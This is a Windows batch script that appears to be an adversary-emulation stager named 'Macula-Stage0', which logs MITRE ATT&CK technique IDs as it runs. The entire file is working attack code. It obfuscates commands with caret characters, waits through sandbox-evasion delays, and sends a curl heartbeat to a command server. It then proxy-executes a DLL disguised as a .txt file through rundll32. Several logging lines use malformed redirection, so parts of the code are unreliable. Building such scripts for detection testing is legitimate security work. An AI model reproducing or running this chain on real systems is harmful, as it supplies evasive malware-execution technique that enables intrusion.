@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ placeholder assignments with random variable names
SET yktnwwf=%APPDATA%\7852\fea2b845
SET fpakbq=Macula-Stage0-7852
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?7852-10
SET omxgazu=BALAM-S2BO
SET yydue=10
SET edjwtl=expressvp.txt
SET fpldhe=7852

REM Additional variables with random names
SET jkvj=%APPDATA%\%yydue%\macula-simulations.log
SET vbkkm=%APPDATA%\7852\fea2b845
SET zxdfgq=Ch^o^ic^e^
SET pthgh=C^:^\W^in^do^ws^\S^ys^te^m3^2^\r^u^n^d^l^l3^2^.
SET lqmtt=e^x^e^
SET grvwn=D^l^l^M^a^in^
SET rhjyi=c^u^r^l^
SET chhy=k^
SET uwoia=s^
SET hlpuw=o^ ^n^u^l^
SET wwkbb=/^t^
SET zbffm=/^n^ob^re^ak^
SET xhnnv=p^i^n^g^
SET zqddf=1^2^7^.^0^.^0^.^1^
SET jgpj=/^n^
SET nrfmq=1^0^
SET qrjrq=C^D^
SET dsgcd=D^
SET tlshe=t^i^m^e^o^u^t^

REM Log file variable
SET hgzjk=%APPDATA%\%yydue%\macula-simulations.log

REM Initial sandbox evasion delay
echo [%DATE% %TIME%][DEBUG][%omxgazu%]: delay_start=initial_sleep>>> "%hgzjk%" 2>nul
%tlshe%%wwkbb% 45 %zbffm% >nul
echo [%DATE% %TIME%][DEBUG][%omxgazu%]: delay_complete=initial_sleep>>> "%hgzjk%" 2>nul

REM Stage 1: Heartbeat check to external server
echo [%DATE% %TIME%][DEBUG][%omxgazu%]: heartbeat_start=checking_server>>> "%hgzjk%" 2>nul
%rhjyi% -%chhy% -%uwoia% -%hlpuw% %rdzgrnne%
IF !ERRORLEVEL! EQU 0 (
    SET sqyec=1
    SET mtmtn=
) ELSE (
    SET sqyec=0
    SET mtmtn=connection_failed
)

REM Log T1218 execution (heartbeat check)
FOR /F "tokens=1-3 delims=/ " %%a IN ("%DATE%") DO SET isoDate=%%c-%%a-%%b
SET logline=[!isoDate! %TIME%][%omxgazu%]: %yydue%-%fpldhe%-T1218|Signed Binary Proxy Execution=!sqyec!:!mtmtn!
(>> "%hgzjk%" echo !logline!) 2>nul || echo >nul

echo [%DATE% %TIME%][DEBUG][%omxgazu%]: heartbeat_complete=result_!sqyec!>>> "%hgzjk%" 2>nul

REM Random delay between operations
echo [%DATE% %TIME%][DEBUG][%omxgazu%]: delay_start=random_operation_delay>>> "%hgzjk%" 2>nul
SET /A hhggt=%RANDOM% %% 15 + 5
%xhnnv% %jgpj% !hhggt! %zqddf% >nul
echo [%DATE% %TIME%][DEBUG][%omxgazu%]: delay_complete=random_operation_delay>>> "%hgzjk%" 2>nul

REM Stage 2: Change to output directory
echo [%DATE% %TIME%][DEBUG][%omxgazu%]: chdir_start=!yktnwwf!>>> "%hgzjk%" 2>nul
%qrjrq% %dsgcd% !yktnwwf!
IF !ERRORLEVEL! NEQ 0 (
    SET mkvlm=0
    SET wxljm=chdir_failed
    GOTO log_ttp
)
echo [%DATE% %TIME%][DEBUG][%omxgazu%]: chdir_complete=!yktnwwf!>>> "%hgzjk%" 2>nul

REM Short delay before execution
echo [%DATE% %TIME%][DEBUG][%omxgazu%]: delay_start=pre_execution_delay>>> "%hgzjk%" 2>nul
%zxdfgq% /C Y /N /D Y /T 8 >nul
echo [%DATE% %TIME%][DEBUG][%omxgazu%]: delay_complete=pre_execution_delay>>> "%hgzjk%" 2>nul

REM Stage 3: Execute rundll32 with obfuscated command
echo [%DATE% %TIME%][DEBUG][%omxgazu%]: process_start=rundll32_dll_load>>> "%hgzjk%" 2>nul
%pthgh%%lqmtt% !edjwtl!,%grvwn%
IF !ERRORLEVEL! EQU 0 (
    SET mkvlm=1
    SET wxljm=
) ELSE (
    SET mkvlm=0
    SET wxljm=dll_load_failed
)

:log_ttp
REM Log T1218 execution (rundll32)
FOR /F "tokens=1-3 delims=/ " %%a IN ("%DATE%") DO SET isoDate2=%%c-%%a-%%b
SET logline2=[!isoDate2! %TIME%][%omxgazu%]: %yydue%-%fpldhe%-T1218.011|Rundll32=!mkvlm!:!wxljm!
(>> "%hgzjk%" echo !logline2!) 2>nul || echo >nul

echo [%DATE% %TIME%][DEBUG][%omxgazu%]: process_complete=rundll32_result_!mkvlm!>>> "%hgzjk%" 2>nul

REM Final cleanup delay
echo [%DATE% %TIME%][DEBUG][%omxgazu%]: delay_start=cleanup_delay>>> "%hgzjk%" 2>nul
%tlshe%%wwkbb% 12 %zbffm% >nul
echo [%DATE% %TIME%][DEBUG][%omxgazu%]: delay_complete=cleanup_delay>>> "%hgzjk%" 2>nul